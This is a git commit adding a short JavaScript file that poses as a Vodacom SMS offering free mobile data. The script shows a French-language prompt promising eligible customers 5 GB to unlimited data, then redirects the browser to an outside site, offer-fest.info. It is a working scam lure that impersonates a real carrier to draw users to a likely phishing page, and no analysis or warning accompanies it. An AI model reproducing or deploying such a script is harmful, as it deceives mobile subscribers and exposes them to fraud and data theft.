75bfc580c7afec871588aa536dce021598cd66d6
ekpesense <abantak9@gmail.com>
2025-02-14 23:11:45 -0800

    Create vodacom-activation.js

---
+++ vodacom-activation.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('Vodacom SMS: Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur DONNÉES GRATUITES pour vérifier maintenant. ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://offer-fest.info/vodacom-data.html';
+}
